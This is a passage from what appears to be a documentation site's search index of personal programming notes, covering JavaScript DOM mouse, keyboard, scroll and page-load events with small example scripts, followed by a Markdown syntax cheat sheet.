&lt;/td&gt;\n    &lt;/tr&gt;\n    &lt;tr&gt;\n      &lt;td class=\"sw\"&gt;&lt;strong&gt;Southwest&lt;/strong&gt;\n        &lt;br&gt;Earth\n        &lt;br&gt;Brown\n        &lt;br&gt;Tranquility\n      &lt;/td&gt;\n      &lt;td class=\"s\"&gt;&lt;strong&gt;South&lt;/strong&gt;\n        &lt;br&gt;Fire\n        &lt;br&gt;Orange\n        &lt;br&gt;Fame\n      &lt;/td&gt;\n      &lt;td class=\"se\"&gt;&lt;strong&gt;Southeast&lt;/strong&gt;\n        &lt;br&gt;Wood\n        &lt;br&gt;Green\n        &lt;br&gt;Romance\n      &lt;/td&gt;\n    &lt;/tr&gt;\n\n  &lt;/table&gt;\n\n  &lt;textarea id=\"text\"&gt;&lt;/textarea&gt;\n\n  &lt;input type=\"button\" onclick=\"text.value=''\" value=\"Clear\"&gt;\n\n  &lt;script&gt;\n// &lt;td&gt; under the mouse right now (if any)\nlet currentElem = null;\n\ntable.onmouseover = function(event) {\n// before entering a new element, the mouse always leaves the previous one\n// if currentElem is set, we didn't leave the previous &lt;td&gt;,\n// that's a mouseover inside it, ignore the event\nif (currentElem) return;\n\nlet target = event.target.closest('td');\n\n// we moved not into a &lt;td&gt; - ignore\nif (!target) return;\n\n// moved into &lt;td&gt;, but outside of our table (possible in case of nested tables)\n// ignore\nif (!table.contains(target)) return;\n\n// hooray! we entered a new &lt;td&gt;\ncurrentElem = target;\nonEnter(currentElem);\n};\n\ntable.onmouseout = function(event) {\n// if we're outside of any &lt;td&gt; now, then ignore the event\n// that's probably a move inside the table, but out of &lt;td&gt;,\n// e.g. from &lt;tr&gt; to another &lt;tr&gt;\nif (!currentElem) return;\n\n// we're leaving the element \u2013 where to? Maybe to a descendant?\nlet relatedTarget = event.relatedTarget;\n\nwhile (relatedTarget) {\n// go up the parent chain and check \u2013 if we're still inside currentElem\n// then that's an internal transition \u2013 ignore it\nif (relatedTarget == currentElem) return;\n\nrelatedTarget = relatedTarget.parentNode;\n}\n\n// we left the &lt;td&gt;. really.\nonLeave(currentElem);\ncurrentElem = null;\n};\n\n// any functions to handle entering/leaving an element\nfunction onEnter(elem) {\nelem.style.background = 'pink';\n\n// show that in textarea\ntext.value += `over -&gt; ${currentElem.tagName}.${currentElem.className}\\n`;\ntext.scrollTop = 1e6;\n}\n\nfunction onLeave(elem) {\nelem.style.background = '';\n\n// show that in textarea\ntext.value += `out &lt;- ${elem.tagName}.${elem.className}\\n`;\ntext.scrollTop = 1e6;\n}\n&lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/Dom/#dragndrop-with-mouse-eventstodo","title":"Drag'n'Drop with mouse events(TODO)","text":"<p>TODO: https://javascript.info/mouse-drag-and-drop</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#pointer-eventstodo","title":"Pointer events(TODO)","text":"<p>TODO: https://javascript.info/pointer-events</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#keyboard-events","title":"Keyboard events","text":"<p>Pressing a key always generates a keyboard events:</p> <ul> <li><code>keypress</code>(legacy) \u2013 no need to use anymore!</li> <li><code>keydown</code> \u2013 on pressing the key (auto-repeats, i.e. triggers again and again if the key is pressed for long)</li> <li><code>keyup</code> \u2013 on releasing the key</li> </ul> <p>The only exception is Fn key, because it\u2019s often implemented on lower level than OS.</p> <p>Main keyboard event properties:</p> <ul> <li><code>event.keyCode/charCode/which</code>(legacy, they use Javascript Char Codes (Key Codes) as their value) - no need to use anymore!</li> <li> <p><code>event.code</code> \u2013 the \u201ckey code\u201d specific to the physical location of the key on keyboard. Key codes described in the UI Events code specification.</p> <p>For instance:</p> <ul> <li> <p>Letter keys have codes <code>Key&lt;letter&gt;</code>: <code>KeyA</code>, <code>KeyB</code> etc.</p> <p>There are several widespread keyboard layouts, and the specification gives key codes for each of them. Read the alphanumeric section of the spec for more codes.</p> </li> <li> <p>Digit keys have codes: <code>Digit&lt;number&gt;</code>: <code>Digit0</code>, <code>Digit1</code> etc.</p> </li> <li> <p>Special keys are mostly coded by their names: <code>Enter</code>, <code>Backspace</code>, <code>Tab</code>,<code>ShiftRight</code> ,<code>ShiftLeft</code> , <code>F1</code> etc.</p> </li> </ul> </li> <li> <p><code>event.key</code> \u2013 the character (<code>\"A\"</code>, <code>\"a\"</code> and so on), for non-character keys, such as Esc, usually has the same value as <code>event.code</code>.</p> </li> </ul> <p><code>event.key</code> vs. <code>event.code</code></p> <p>To handle keyboard layout-dependant keys \u2192 <code>event.key</code> is the way to go. Because same letters in different layouts may map to different physical keys, leading to different codes. See the full list in the specification.</p> <p>To get a hotkey to work even after a language switch \u2192 <code>event.code</code> may be better.</p> <ul> <li><code>event.repeat</code> - for events triggered by auto-repeat this property set to <code>true</code>(defatul value is <code>fasle</code>)</li> </ul> <p>Examples:</p> <ul> <li> <p>Preventing default acitons on <code>keydown</code>:</p> <p>We can cancel most of them, with the exception of OS-based special keys. For instance, on Windows Alt+F4 closes the current browser window. And there\u2019s no way to stop it by preventing the default action in JavaScript.</p> <p>For instance, the <code>&lt;input&gt;</code> below expects a phone number, so it does not accept keys except digits, <code>+</code>, <code>()</code>, <code>-</code>, <code>Left</code>, <code>Right</code>, <code>Delete</code>, <code>Backspace</code>:</p> <pre><code>&lt;script&gt;\nfunction checkPhoneKey(key) {\nreturn (key &gt;= '0' &amp;&amp; key &lt;= '9') ||\n['+','(',')','-','ArrowLeft','ArrowRight','Delete','Backspace'].includes(key);\n}\n&lt;/script&gt;\n&lt;input onkeydown=\"return checkPhoneKey(event.key)\" placeholder=\"Phone, please\" type=\"tel\"&gt;\n</code></pre> <p>The onkeydown handler here uses checkPhoneKey to check for the key pressed. If it\u2019s valid, then it returns <code>true</code>, otherwise <code>false</code>. As we know, the <code>false</code> value returned from the event handler, assigned using a DOM property or an attribute, such as above, prevents the default action, so nothing appears in the <code>&lt;input&gt;</code> for keys that don\u2019t pass the test. (The <code>true</code> value returned doesn\u2019t affect anything, only returning <code>false</code> matters)</p> </li> <li> <p>Text characters limit counter:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n  &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n  &lt;title&gt;Document&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n  &lt;style&gt;\n.textarea {\n}\n\n.textarea__item {\nwidth: 300px;\nheight: 150px;\npadding: 10px;\nfont-size: 18px;\ncolor: #fff;\nbackground-color: rgb(44, 43, 43);\n}\n\n.textarea__counter {\n}\n&lt;/style&gt;\n\n  &lt;div class=\"textarea\"&gt;\n    &lt;textarea autocomplete=\"off\" maxlength=\"30\" name=\"form[]\" class=\"textarea__item\"&gt;&lt;/textarea&gt;\n    &lt;div class=\"textarea__counter\"&gt;\u041e\u0441\u0442\u0430\u043b\u043e\u0441\u044c &lt;span&gt;&lt;/span&gt; \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432&lt;/div&gt;\n  &lt;/div&gt;\n\n  &lt;script&gt;\nconst txtItem = document.querySelector('.textarea__item');\nconst txtItemLimit = txtItem.getAttribute('maxlength');\nconst txtCounter = document.querySelector('.textarea__counter span');\ntxtCounter.innerHTML = txtItemLimit;\n\ntxtItem.addEventListener(\"keyup\", txtSetCounter);\ntxtItem.addEventListener(\"keydown\", function (event) {\nif (event.repeat) txtSetCounter();\n});\n\nfunction txtSetCounter() {\nconst txtCounterResult = txtItemLimit - txtItem.value.length;\ntxtCounter.innerHTML = txtCounterResult;\n}\n&lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> </li> </ul> <p>Not 100% reliable.</p> <p>In the past, keyboard events were sometimes used to track user input in form fields. That\u2019s not reliable, because the input can come from various sources(e.g. mobile keyboards formally known as IME(Input-Method Editor)). We have <code>input</code> and <code>change</code> events to handle any input (covered in TODO: Events: change, input, cut, copy, paste). They trigger after any kind of input, including copy-pasting or speech recognition.</p> <p>We should use keyboard events when we really want keyboard.</p> <p>For example, to react on hotkeys or special keys.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#scrolling","title":"Scrolling","text":"<p><code>scroll</code> event - allows reacting to a page or element scrolling</p> <p>May be used for:</p> <ul> <li>Show/hide additional controls or information depending on where in the document the user is.</li> <li>Load more data when the user scrolls down till the end of the page.</li> </ul> <p>BUT: there is more interesting way to implement these(and many others) functionalitis by using IntersectionObserver which allows asynchronously watch for intersection of the element with his parent or visible document area.</p> <pre><code>// a small function to show the current scroll:\nwindow.addEventListener('scroll', function() {\ndocument.getElementById('showScroll').innerHTML = window.pageYOffset + 'px';\n});\n/*\nIn action:\n  - The 'scroll' event works both on the 'window' and on scrollable elements.\n*/\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/Dom/#prevent-scrolling","title":"Prevent scrolling","text":"<p>We can\u2019t prevent scrolling by using <code>event.preventDefault()</code> in onscroll listener, because it triggers after the scroll has already happened. But we can prevent scrolling by <code>event.preventDefault()</code> on an event that causes the scroll, for instance <code>keydown</code> event for Page Up and Page Down. If we add an event handler to these events and <code>event.preventDefault()</code> in it, then the scroll won\u2019t start.</p> <p>BUT: There are many ways to initiate a scroll, so it\u2019s more reliable to use CSS, <code>overflow: hidden;</code> property.</p>"},{"location":"Dev/Prg/Langs/Js/Dom/#document-and-resource-loading","title":"Document and resource loading","text":""},{"location":"Dev/Prg/Langs/Js/Dom/#page-domcontentloaded-load-beforeunload-unload","title":"Page: <code>DOMContentLoaded</code>, <code>load</code>, <code>beforeunload</code>, <code>unload</code>","text":"<p>Page load events:</p> <ul> <li> <p><code>DOMContentLoaded</code> - triggers on <code>document</code> when the browser fully loaded HTML, and the DOM tree is built, but external resources like pictures <code>&lt;img&gt;</code> and stylesheets, etc. may not yet have loaded.</p> <p>Usage: the handler can lookup DOM nodes, initialize the interface.</p> <p>We must use <code>addEventListener</code> to catch it:</p> <pre><code>&lt;script&gt;\nfunction ready() {\nalert('DOM is ready');\n\n// image is not yet loaded (unless it was cached), so the size is 0x0\nalert(`Image size: ${img.offsetWidth}x${img.offsetHeight}`);\n}\n/*\n  The 'DOMContentLoaded' handler runs when the document is loaded,\n  so it can see all the elements, including &lt;img&gt; below.\n  But it doesn\u2019t wait for the image to load. So 'alert' shows zero sizes.\n   */\ndocument.addEventListener(\"DOMContentLoaded\", ready);\n// not \"document.onDOMContentLoaded = ...\"\n&lt;/script&gt;\n\n&lt;img id=\"img\" src=\"https://en.js.cx/clipart/train.gif?speed=1&amp;cache=0\"&gt;\n</code></pre> <p>Peculiarities(\u043e\u0441\u043e\u0431\u0435\u043d\u043d\u043e\u0441\u0442\u0438) regarding  <code>DOMContentLoaded</code> event running:</p> <ol> <li> <p>Script such as <code>&lt;script&gt;...&lt;/script&gt;</code> or <code>&lt;script src=\"...\"&gt;&lt;/script&gt;</code> block DOMContentLoaded.</p> <p>When the browser processes an HTML-document and comes across a <code>&lt;script&gt;</code> tag, it needs to execute before continuing building the DOM. That\u2019s a precaution, as scripts may want to modify DOM, and even <code>document.write</code> into it, so <code>DOMContentLoaded</code> has to wait.</p> <pre><code>&lt;!-- we first see \u201cLibrary loaded\u2026\u201d, and then \u201cDOM ready!\u201d (all scripts are executed) --&gt;\n&lt;script&gt;\ndocument.addEventListener(\"DOMContentLoaded\", () =&gt; {\nalert(\"DOM ready!\");\n});\n\n&lt;/script&gt;\n\n&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.3.0/lodash.js\"&gt;&lt;/script&gt;\n\n&lt;script&gt;\nalert(\"Library loaded, inline script executed\");\n&lt;/script&gt;\n</code></pre> <p>Scripts that don\u2019t block DOMContentLoaded.</p> <p>There are two exceptions from this rule:</p> <ol> <li>Scripts with the <code>async</code> attribute, don\u2019t block <code>DOMContentLoaded</code>. See TODO: https://javascript.info/script-async-defer</li> <li>Scripts that are generated dynamically with <code>document.createElement('script')</code> and then added to the webpage also don\u2019t block this event.</li> </ol> </li> <li> <p>Images and other resources may also still continue loading.</p> <p>External style sheets don\u2019t affect DOM, so <code>DOMContentLoaded</code> does not wait for them.</p> <p>BUT: If we have a script after the style, then that script must wait until the stylesheet loads:</p> <pre><code>&lt;link type=\"text/css\" rel=\"stylesheet\" href=\"style.css\"&gt;\n&lt;script&gt;\n// the script doesn't execute until the stylesheet is loaded\nalert(getComputedStyle(document.body).marginTop);\n&lt;/script&gt;\n</code></pre> <p>The reason for this is that the script may want to get coordinates and other style-dependent properties of elements, like in the example above. Naturally, it has to wait for styles to load. As <code>DOMContentLoaded</code> waits for scripts, it now waits for styles before them as well.</p> </li> <li> <p>Built-in browser autofill.</p> <p>Firefox, Chrome and Opera autofill forms on <code>DOMContentLoaded</code>.</p> <p>For instance, if the page has a form with login and password, and the browser remembered the values, then on <code>DOMContentLoaded</code> it may try to autofill them (if approved by the user).</p> <p>So if <code>DOMContentLoaded</code> is postponed by long-loading scripts, then autofill also awaits \u2013 the login/password fields don\u2019t get autofilled immediately, but there\u2019s a delay till the page fully loads. That\u2019s actually the delay until the <code>DOMContentLoaded</code> event.</p> </li> </ol> </li> <li> <p><code>load</code> - triggers on <code>window</code> when the page and all external resources(images, styles etc.) are loaded.</p> <p>Usage: external resources are loaded, so styles are applied, image sizes are known etc. We rarely use it, because there\u2019s usually no need to wait for so long.</p> <pre><code>&lt;!-- correctly shows image sizes, because 'window.onload' waits for all images: --&gt;\n&lt;script&gt;\nwindow.onload = function() { // can also use window.addEventListener('load', (event) =&gt; {\nalert('Page loaded');\n\n// image is loaded at this time\nalert(`Image size: ${img.offsetWidth}x${img.offsetHeight}`);\n};\n&lt;/script&gt;\n\n&lt;img id=\"img\" src=\"https://en.js.cx/clipart/train.gif?speed=1&amp;cache=0\"&gt;\n</code></pre> </li> <li> <p><code>beforeunload</code> - triggers on <code>window</code> when the user initiated navigation away from the page or tries to close the window; in this case the handler asks for additional confirmation</p> <p>Usage: cancel the transition to another page - if we cancel the event, browser asks whether the user really wants to leave(e.g. we have unsaved changes).</p> <pre><code>window.onbeforeunload = function() {\nreturn false;\n};\n</code></pre> <p>For historical reasons, returning a non-empty string also counts as canceling the event. Some time ago browsers used to show it as a message, but as the modern specification says, they shouldn\u2019t. The behavior was changed, because some webmasters abused this event handler by showing misleading and annoying messages. So right now old browsers still may show it as a message, but aside of that \u2013 there\u2019s no way to customize the message shown to the user.</p> <pre><code>window.onbeforeunload = function() {\nreturn \"There are unsaved changes. Leave now?\";\n};\n</code></pre> <p>The <code>event.preventDefault()</code> doesn\u2019t work from a <code>beforeunload</code> handler</p> <p>That may sound weird, but most browsers ignore <code>event.preventDefault()</code>. Which means, following code may not work:</p> <pre><code>window.addEventListener(\"beforeunload\", (event) =&gt; {\n// doesn't work, so this event handler doesn't do anything\nevent.preventDefault();\n});\n</code></pre> <p>Instead, in such handlers one should set <code>event.returnValue</code> to a string to get the result similar to the code above:</p> <pre><code>window.addEventListener(\"beforeunload\", (event) =&gt; {\n// works, same as returning from window.onbeforeunload\nevent.returnValue = \"There are unsaved changes. Leave now?\";\n});\n</code></pre> </li> <li> <p><code>unload</code> - triggers on <code>window</code> when the user is finally leaving</p> <p>Usage: the user almost left and in the handler we can only do simple things that do not involve delays or asking a user. Because of that limitation, it\u2019s rarely used. For instanse:</p> <ul> <li>we can close related popup windows</li> <li> <p>we can send out a network request with a special <code>navigator.sendBeacon(url, data)</code> method (described in the specification https://w3c.github.io/beacon/), that contains e.g. the data about how the page is used: mouse clicks, scrolls, viewed page areas, and so on</p> <p><code>sendBeacon</code> sends data in background without delaying the  transition to another page: the browser leaves the page, but still performs <code>sendBeacon</code>. Here\u2019s how to use it:</p> <pre><code>let analyticsData = { /* object with gathered data */ };\n\nwindow.addEventListener(\"unload\", function() {\nnavigator.sendBeacon(\"/analytics\", JSON.stringify(analyticsData));\n});\n</code></pre> <ol> <li>the request is sent as POST</li> <li>we can send not only a string, but also forms and other formats(see Fetch), but usually it\u2019s a stringified object</li> <li>the data is limited by 64kb</li> </ol> <p>When the <code>sendBeacon</code> request is finished, the browser probably has already left the document, so there\u2019s no way to get server response (which is usually empty for analytics).   There\u2019s also a <code>keepalive</code> flag for doing such \u201cafter-page-left\u201d requests in fetch method for generic network requests. You can find more information in the chapter Fetch API.</p> </li> </ul> </li> <li> <p><code>readystatechange</code> - tracks the changes in value of the <code>document.readyState</code> method(see below at this point)</p> <p>It is an alternative mechanics of tracking the document loading state, it appeared long ago. Nowadays, it is rarely used.</p> <pre><code>// current state\nconsole.log(document.readyState); // prints 'loading'\n// print state changes\ndocument.addEventListener('readystatechange', () =&gt; console.log(document.readyState)); // prints 'interactive' and then 'complete'\n</code></pre> </li> </ul> <p>document.readyState - current state of the document, has 3 following values:</p> <ul> <li><code>loading</code> \u2013 the document is loading.</li> <li><code>interactive</code> \u2013 the document is parsed(= was fully read), happens at about the same time as <code>DOMContentLoaded</code>, but before it.</li> <li><code>complete</code> \u2013 the document and resources are loaded(= was fully read and all resources(like images) are loaded too), happens at about the same time as <code>window.onload</code>, but before it</li> </ul> <p>We can check <code>document.readyState</code> and setup a handler or execute the code immediately if it\u2019s ready, like this:</p> <pre><code>function work() { /*...*/ }\n\nif (document.readyState == 'loading') {\n// still loading, wait for the event\ndocument.addEventListener('DOMContentLoaded', work);\n} else {\n// DOM is ready!\nwork();\n}\n</code></pre>"},{"location":"Dev/Prg/Langs/Md/","title":"Markdown","text":""},{"location":"Dev/Prg/Langs/Md/#markdown-essentials","title":"Markdown Essentials","text":""},{"location":"Dev/Prg/Langs/Md/#emphasis","title":"Emphasis","text":"<pre><code>Emphasis, aka italics, with *asterisks* or _underscores_.\n\nStrong emphasis, aka bold, with **asterisks** or __underscores__.\n\nCombined emphasis with **asterisks and _underscores_**.\n\nStrikethrough uses two tildes. ~~Scratch this.~~\n</code></pre> <p>Emphasis, aka italics, with asterisks or underscores.</p> <p>Strong emphasis, aka bold, with asterisks or underscores.</p> <p>Combined emphasis with asterisks and underscores.</p> <p>Strikethrough uses two tildes. Scratch this.</p>"},{"location":"Dev/Prg/Langs/Md/#lists","title":"Lists","text":"<pre><code>**Task Lists**\n\n- [x] Task 1\n- [ ] Task 2\n    - [x] Subtask A\n    - [ ] Subtask B\n- [ ] Task 3\n\n**Ordered and Unordered Lists**\n\n1. First ordered list item\n2. Another item\n\u22c5\u22c5* Unordered sub-list.\n1. Actual numbers don't matter, just that it's a number\n\u22c5\u22c51. Ordered sub-list\n1. And another item.\n\n\u22c5\u22c5\u22c5\u22c5You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we'll use four here to also align the raw Markdown).\n\n\u22c5\u22c5\u22c5\u22c5To have a line break without a paragraph, you will need to use *two trailing spaces*.\u22c5\u22c5\n\u22c5\u22c5\u22c5\u22c5Note that this line is separate, but within the same paragraph.\u22c5\u22c5\n\u22c5\u22c5\u22c5\u22c5(This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)\n\n* Unordered list can use asterisks\n- Or minuses\n+ Or pluses\n</code></pre> <p>Task Lists</p> <ul> <li> Task 1</li> <li> Task 2<ul> <li> Subtask A</li> <li> Subtask B</li> </ul> </li> <li> Task 3</li> </ul> <p>Ordered and Unordered Lists</p> <ol> <li>First ordered list item</li> <li>Another item<ul> <li>Unordered sub-list.</li> </ul> </li> <li>Actual numbers don't matter, just that it's a number<ol> <li>Ordered sub-list</li> </ol> </li> <li> <p>And another item.</p> <p>You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we'll use four here to also align the raw Markdown).</p> <p>To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</p> </li> <li> <p>Unordered list can use asterisks</p> </li> <li>Or minuses</li> <li>Or pluses</li> </ol>"},{"location":"Dev/Prg/Langs/Md/#links","title":"Links","text":"<p>There are two ways to create links.</p> <pre><code>[I'm an inline-style link](https://www.google.com){target=_blank}\n\n[I'm an inline-style link with title](https://www.google.com \"Google's Homepage\"){target=_blank}\n\n[I'm a reference-style link][Arbitrary case-insensitive reference text]\n\n[I'm a relative reference to a repository file](../blob/master/LICENSE)\n\n[You can use numbers for reference-style link definitions][1]\n\nOr leave it empty and use the [link text itself].\n\nURLs and URLs in angle brackets will automatically get turned into links.\nhttp://www.example.com or &lt;http://www.example.com&gt; and sometimes\nexample.com (but not on Github, for example).\n\nSome text to show that the reference links can follow later.\n\n[arbitrary case-insensitive reference text]: https://www.mozilla.org\n[1]: http://slashdot.org\n[link text itself]: http://www.reddit.com\n</code></pre> <p>I'm an inline-style link</p> <p>I'm an inline-style link with title</p> <p>I'm a reference-style link</p> <p>I'm a relative reference to a repository file</p> <p>You can use numbers for reference-style link definitions</p> <p>Or leave it empty and use the link text itself.</p> <p>URLs and URLs in angle brackets will automatically get turned into links. http://www.example.com or http://www.example.com and sometimes example.com (but not on Github, for example).</p> <p>Some text to show that the reference links can follow later.</p>"},{"location":"Dev/Prg/Langs/Md/#images","title":"Images","text":"<pre><code>Logo (hover to see the title text):\n\nInline-style:\n![alt text](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png \"Logo Title Text 1\")\n\nReference-style:\n![alt text][logo]\n\n[logo]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png \"Logo Title Text 2\"\n</code></pre> <p>Logo (hover to see the title text):</p> <p>Inline-style: </p> <p>Reference-style: </p>"},{"location":"Dev/Prg/Langs/Md/#code-and-syntax-highlighting","title":"Code and Syntax Highlighting","text":"<p>Code blocks are part of the Markdown spec, but syntax highlighting isn't. However, many renderers -- like Github's and Markdown Here -- support syntax highlighting. Which languages are supported and how those language names should be written will vary from renderer to renderer. Markdown Here supports highlighting for dozens of languages (and not-really-languages, like diffs and HTTP headers); to see the complete list, and how to write the language names, see the highlight.js demo page.</p> <pre><code>Inline `code` has `back-ticks around` it.\n</code></pre> <p>Inline <code>code</code> has <code>back-ticks around</code> it.</p> <p>Blocks of code are either fenced by lines with three back-ticks <code>```</code>, or are indented with four spaces. I recommend only using the fenced code blocks -- they're easier and only they support syntax highlighting.</p> <pre><code>  ```js\n  var s = \"JavaScript syntax highlighting\";\n  alert(s);\n  ```\n\n  ```python\n  s = \"Python syntax highlighting\"\n  print s\n  ```\n\n  ```\n  No language indicated, so no syntax highlighting.\n  But let's throw in a &lt;b&gt;tag&lt;/b&gt;.\n  ```\n</code></pre> <pre><code>var s = \"JavaScript syntax highlighting\";\nalert(s);\n</code></pre> <pre><code>s = \"Python syntax highlighting\"\nprint s\n</code></pre> <pre><code>No language indicated, so no syntax highlighting.\nBut let's throw in a &lt;b&gt;tag&lt;/b&gt;.\n</code></pre>"},{"location":"Dev/Prg/Langs/Md/#tables","title":"Tables","text":"<p>Tables aren't part of the core Markdown spec, but they are part of GFM.</p> <pre><code>Colons can be used to align columns.\n\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      | centered      |   $12 |\n| zebra stripes | are neat      |    $1 |\n\nThere must be at least 3 dashes separating each header cell.\nThe outer pipes (|) are optional, and you don't need to make the\nraw Markdown line up prettily. You can also use inline Markdown.\n\nMarkdown | Less | Pretty\n--- | --- | ---\n*Still* | `renders` | **nicely**\n1 | 2 | 3\n</code></pre> <p>Colons can be used to align columns.</p> Tables Are Cool col 3 is right-aligned $1600 col 2 is centered $12 zebra stripes are neat $1 <p>There must be at least 3 dashes separating each header cell. The outer pipes (|) are optional, and you don't need to make the raw Markdown line up prettily. You can also use inline Markdown.</p> Markdown Less Pretty Still <code>renders</code> nicely 1 2 3"},{"location":"Dev/Prg/Langs/Md/#blockquotes","title":"Blockquotes","text":"<pre><code>&gt; Blockquotes are very handy in email to emulate reply text.\n&gt; This line is part of the same quote.\n\nQuote break.\n\n&gt; This is a very long line that will still be quoted properly when it wraps. Oh boy let's keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can *put* **Markdown** into a blockquote.\n</code></pre> <p>Blockquotes are very handy in email to emulate reply text. This line is part of the same quote.</p> <p>Quote break.</p> <p>This is a very long line that will still be quoted properly when it wraps. Oh boy let's keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can put Markdown into a blockquote.</p>"},{"location":"Dev/Prg/Langs/Md/#inline-html","title":"Inline HTML","text":"<p>You can also use raw HTML in your Markdown, and it'll mostly work pretty well.</p> <pre><code>&lt;dl&gt;\n  &lt;dt&gt;Definition list&lt;/dt&gt;\n  &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt;\n\n  &lt;dt&gt;Markdown in HTML&lt;/dt&gt;\n  &lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;\n&lt;/dl&gt;\n</code></pre> Definition list Is something people use sometimes. Markdown in HTML Does *not* work **very** well. Use HTML tags."},{"location":"Dev/Prg/Langs/Md/#horizontal-rule","title":"Horizontal Rule","text":"<pre><code>Three or more...\n\n---\n\nHyphens\n\n***\n\nAsterisks\n\n___\n\nUnderscores\n</code></pre> <p>Three or more...</p> <p>Hyphens</p> <p>Asterisks</p> <p>Underscores</p>"},{"location":"Dev/Prg/Langs/Md/#line-breaks","title":"Line Breaks","text":"<p>My basic recommendation for learning how line breaks work is to experiment and discover -- hit \u2324 (Enter) once (i.e., insert one newline), then hit it twice (i.e., insert two newlines), see what happens. You'll soon learn to get what you want. \"Markdown Toggle\" is your friend.</p> <p>Here are some things to try out:</p> <pre><code>Here's a line for us to start with.\n\n\nThis line is separated from the one above by two newlines, so it will be a *separate paragraph*.\n\nThis line is also a separate paragraph, but...\nThis line is only separated by a single newline, so it's a separate line in the *same paragraph*.\n</code></pre> <p>Here's a line for us to start with.</p> <p>This line is separated from the one above by two newlines, so it will be a separate paragraph.</p> <p>This line is also a separate paragraph, but... This line is only separated by a single newline, so it's a separate line in the same paragraph.</p> <p>Note</p> <p>In GFM line breaks there's no need to use MD's two-space line breaks.</p>"},{"location":"Dev/Prg/Langs/Md/#youtube-videos","title":"YouTube Videos","text":"<p>They can't be added directly but you can add an image with a link to the video like this:</p> <pre><code>&lt;a href=\"http://www.youtube.com/watch?feature=player_embedded&amp;v=YOUTUBE_VIDEO_ID_HERE\n\" target=\"_blank\"&gt;&lt;img src=\"http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg\"\nalt=\"IMAGE ALT TEXT HERE\" width=\"240\" height=\"180\" border=\"10\" /&gt;&lt;/a&gt;\n</code></pre> <p>Or, in pure Markdown, but losing the image sizing and border:</p> <pre><code>[![IMAGE ALT TEXT HERE](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)\n</code></pre>"},{"location":"Dev/Prg/Langs/Md/#about-youtube-video-thumbnails","title":"About YouTube video thumbnails","text":"<p>Each YouTube video has four generated images. They are predictably formatted as follows:</p> <pre><code>https://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/0.jpg\nhttps://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/1.jpg\nhttps://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/2.jpg\nhttps://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/3.jpg\n</code></pre> <p>The first one in the list is a full size image and others are thumbnail images. The default thumbnail image (i.e., one of <code>1.jpg</code>, <code>2.jpg</code>, <code>3.jpg</code>) is:</p> <pre><code>https://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/default.jpg\n</code></pre> <p>There are also other versions of the thumbnail:</p> <pre><code>https://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/hqdefault.jpg       &lt;!-- high quality thumbnail --&gt;\nhttps://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/mqdefault.jpg       &lt;!-- medium quality tumbnail --&gt;\nhttps://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/sddefault.jpg       &lt;!-- standard definition thumbnail --&gt;\nhttps://img.youtube.com/vi/&lt;insert-youtube-video-id-here&gt;/maxresdefault.jpg   &lt;!-- maximum resolution thumbnail --&gt;\n</code></pre> <p>Note</p> <p>All of the above URLs are available over HTTP too. Additionally, the slightly shorter hostname <code>i3.ytimg.com</code> works in place of <code>img.youtube.com</code> in the example URLs above.</p>"},{"location":"Dev/Prg/Langs/Md/#markdown-docsify","title":"Markdown Docsify","text":""},{"location":"Dev/Prg/Langs/Md/#text","title":"Text","text":"<pre><code>~~Strikethrough~~\n\n&lt;mark&gt;Marked text&lt;/mark&gt;\n\n&lt;pre&gt;Preformatted text&lt;/pre&gt;\n\n&lt;small&gt;Small Text&lt;/small&gt;\n\nThis is &lt;sub&gt;subscript&lt;/sub&gt;\n\nThis is &lt;sup&gt;superscript&lt;/sup&gt;\n</code></pre> <p>Strikethrough</p> <p>Marked text</p> <pre>Preformatted text</pre> <p>Small Text</p> <p>This is subscript</p> <p>This is superscript</p>"},{"location":"Dev/Prg/Langs/Md/#keyboard","title":"Keyboard","text":"<pre><code>&lt;kbd&gt;&amp;uarr;&lt;/kbd&gt; Arrow Up\n\n&lt;kbd&gt;&amp;darr;&lt;/kbd&gt; Arrow Down\n\n&lt;kbd&gt;&amp;larr;&lt;/kbd&gt; Arrow Left\n\n&lt;kbd&gt;&amp;rarr;&lt;/kbd&gt; Arrow Right\n\n&lt;kbd&gt;&amp;#8682;&lt;/kbd&gt; Caps 